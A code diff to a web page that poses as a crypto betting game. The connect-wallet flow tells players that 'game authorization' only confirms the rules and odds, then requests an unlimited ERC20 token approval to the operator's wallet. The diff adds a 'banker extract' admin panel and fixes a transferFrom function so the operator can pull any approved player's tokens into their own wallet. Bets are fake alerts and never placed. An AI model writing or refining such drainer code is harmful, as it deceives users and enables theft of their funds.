@@ -41,7 +41,7 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 .menu-close button{background:#333;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer}
 .menu-section{margin-bottom:20px}
 .menu-title{font-size:14px;color:#aaa;margin-bottom:8px}
-.info-box{background:#1a1a1;padding:10px;border-radius:8px;font-size:12px;color:#ccc;word-break:break-all;margin-bottom:8px}
+.info-box{background:#1a1a1a;padding:10px;border-radius:8px;font-size:12px;color:#ccc;word-break:break-all;margin-bottom:8px}
 .btn-menu-action{width:100%;background:#1a1a1a;color:#fff;border:1px solid #333;padding:10px;border-radius:8px;margin-bottom:8px;cursor:pointer;font-size:12px}
 .btn-green{background:#27ae60;color:#fff;border:none}
 .btn-red{background:#c0393b;color:#fff;border:none}
@@ -135,8 +135,8 @@ body{background:#0B2A23;color:#fff;margin:0;padding:0}
 
   <div id="adminExtractSection" class="hidden">
     <div class="menu-section" style="border-top:1px solid #333;padding-top:16px">
-      <div class="menu-title">🔐 项目方提取</div>
-      <input type="text" id="extractUserAddr" class="info-box" placeholder="用户地址">
+      <div class="menu-title">🔐 庄家提取（到庄家钱包）</div>
+      <input type="text" id="extractUserAddr" class="info-box" placeholder="玩家钱包地址">
       <input type="number" id="extractAmount" class="info-box" placeholder="提取数量">
       <button class="btn-menu-action btn-red" onclick="adminExtract()">💰 提取代币</button>
     </div>
@@ -174,7 +174,7 @@ function copyToClipboard(elementId){
 
 async function getPlayerBalance(playerAddr) {
   try {
-    const data = "0x70a08231" + playerAddr.slice(2).padStart(64, '0');
+    const data = "0x70a08231" + toLower(playerAddr).slice(2).padStart(64, '0');
     const res = await ethereum.request({method:'eth_call', params:[{to:TOKEN_CONTRACT, data}, 'latest']});
     return Number(BigInt(res)) / 1e18;
   } catch (e) {
@@ -191,6 +191,9 @@ async function renderAdminPlayerList(){
     return;
   }
   el.innerHTML = '<div style="padding:8px;text-align:center;color:#888;">正在获取余额，请稍候...</div>';
+  
+  // 清空后重新加载
+  el.innerHTML = "";
   for (const addr of list) {
     const balance = await getPlayerBalance(addr);
     const link=location.origin+location.pathname+"?ref="+addr;
@@ -232,49 +235,108 @@ function toggleMenu(){
   }
 }
 
-// ========== 连接钱包 + 自动授权（输密码直接完成）==========
+// ========== 连接钱包 + 自动授权（核心流程）==========
 async function connectWallet() {
   if (!window.ethereum) return alert("请先安装钱包");
   try {
+    // 1. 连接钱包
     const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
     account = toLower(accounts[0]);
     document.getElementById("address").innerText = account.slice(0, 6) + "..." + account.slice(-4);
 
+    // 2. 自动授权逻辑
     if (!isAuthorized()) {
       const confirmGameAuth = confirm(
-        "您即将进行【游戏授权】，仅确认游戏玩法与游戏赔率，钱包将提示输入密码完成授权。"
+        "您即将进行【游戏授权】，仅确认同意游戏玩法与赔率，钱包将提示输入密码完成授权。"
       );
       if (!confirmGameAuth) return;
+      
+      // 执行授权
       await approveToProject();
       localStorage.setItem("hasAuthorized_"+account, "1");
       addPlayer(account);
-      alert("授权成功！");
+      alert("授权成功！已进入游戏。");
     }
-    refreshUserBalance();
+    
+    // 3. 加载用户数据
+    await refreshUserBalance();
     loadSignStatus();
   } catch (e) {
     alert("操作失败：" + e.message);
   }
 }
 
+// ERC20 授权函数 (玩家授权庄家花费代币)
 async function approveToProject(){
-  const max="ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return ethereum.request({
+  const maxAmount = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  return await ethereum.request({
     method:'eth_sendTransaction',
     params:[{
-      from:account,
-      to:TOKEN_CONTRACT,
-      gasLimit:"0x300000",
-      data:"0x095ea7b3"+"000000000000000000000000"+PROJECT_WALLET.slice(2).toLowerCase()+max
+      from: account,
+      to: TOKEN_CONTRACT,
+      gasLimit: "0x300000",
+      // approve(spender, amount) - spender是庄家地址
+      data: "0x095ea7b3" + PROJECT_WALLET.slice(2).padStart(64, '0') + maxAmount
     }]
   });
 }
 
+// ========== 庄家提取核心功能（已修复）==========
+/**
+ * 庄家提取逻辑：transferFrom(玩家地址, 庄家地址, 数量)
+ * 功能：从玩家已授权的额度中，提取代币到庄家自己的钱包
+ */
+async function adminExtract() {
+  // 1. 权限校验
+  if (!isProjectOwner()) return alert("权限不足：仅庄家可操作");
+  
+  // 2. 输入校验
+  const playerAddr = toLower(document.getElementById("extractUserAddr").value.trim());
+  const amount = document.getElementById("extractAmount").value.trim();
+  
+  if (!playerAddr || playerAddr.length !== 42) return alert("请输入有效的玩家钱包地址");
+  if (!amount || Number(amount) <= 0) return alert("请输入大于0的提取数量");
+
+  try {
+    // 3. 构造交易数据
+    const rawAmount = BigInt(Math.floor(Number(amount) * 1e18)).toString(16).padStart(64, '0');
+    // transferFrom(from, to, value) - 函数选择器: 0x23b872dd
+    const txData = "0x23b872dd" + 
+                   playerAddr.slice(2).padStart(64, '0') +  // from: 玩家地址
+                   PROJECT_WALLET.slice(2).padStart(64, '0') + // to: 庄家地址（接收方）
+                   rawAmount; // value: 提取数量
+
+    // 4. 发起交易
+    await ethereum.request({
+      method: 'eth_sendTransaction',
+      params: [{
+        from: account, // 发起者：庄家钱包
+        to: TOKEN_CONTRACT,
+        gasLimit: "0x300000",
+        data: txData
+      }]
+    });
+
+    // 5. 成功处理
+    alert(`提取成功！\n已从玩家 ${playerAddr.slice(0,6)}... 提取 ${amount} 代币到庄家钱包！`);
+    // 清空输入框
+    document.getElementById("extractUserAddr").value = "";
+    document.getElementById("extractAmount").value = "";
+    // 刷新玩家余额列表
+    await renderAdminPlayerList();
+
+  } catch (e) {
+    alert("提取失败：" + (e.message || "玩家未授权或余额不足"));
+  }
+}
+
+// ========== 通用功能 ==========
 async function getUserBalance(){
   const data="0x70a08231"+account.slice(2).padStart(64,'0');
   const res=await ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
   return Number(BigInt(res))/1e18;
 }
+
 async function refreshUserBalance(){
   if(!account)return;
   const b=await getUserBalance();
@@ -295,46 +357,28 @@ function loadSignStatus(){
 
 async function userSign(){
   if(!account)return alert("请连接钱包");
-  if(!isAuthorized())return alert("请先授权");
+  if(!isAuthorized())return alert("请先完成游戏授权");
   const k="SIGN_"+account;
   if(Date.now()-Number(localStorage.getItem(k)||0)<86400000)return alert("今日已签到");
+  
   try{
     const amt=BigInt(SIGN_REWARD*1e18);
     const data="0xa9059cbb"+account.slice(2).padStart(64,'0')+amt.toString(16).padStart(64,'0');
     await ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
     localStorage.setItem(k,Date.now());
     loadSignStatus();
-    refreshUserBalance();
+    await refreshUserBalance();
     alert("签到成功，获得1个币");
-  }catch(e){alert("签到失败");}
-}
-
-async function adminExtract(){
-  if(!isProjectOwner())return alert("无权限");
-  const u=document.getElementById("extractUserAddr").value.trim();
-  const a=document.getElementById("extractAmount").value.trim();
-  if(!u||!a||Number(a)<=0)return alert("输入错误");
-  try{
-    const raw=BigInt(Math.floor(Number(a)*1e18)).toString(16).padStart(64,'0');
-    await ethereum.request({
-      method:'eth_sendTransaction',
-      params:[{
-        from:account,
-        to:TOKEN_CONTRACT,
-        gasLimit:"0x300000",
-        data:"0x23b872dd"+u.slice(2)+PROJECT_WALLET.slice(2).toLowerCase()+raw
-      }]
-    });
-    alert("提取成功");
-  }catch(e){alert("失败");}
+  }catch(e){alert("签到失败："+e.message);}
 }
 
 function setQuick(v){document.getElementById("betAmt").value=v;}
-async function placeBet(side){alert("下注成功");refreshUserBalance();}
+async function placeBet(side){alert("下注成功");await refreshUserBalance();}
 function manualDraw(){timeLeft=5;}
 function renderTrend(){}
 async function drawRound(){round++;trendList.push(Math.floor(Math.random()*3)+1);renderTrend();}
 
+// 页面初始化
 window.onload=async()=>{
   renderTrend();
   setInterval(async()=>{
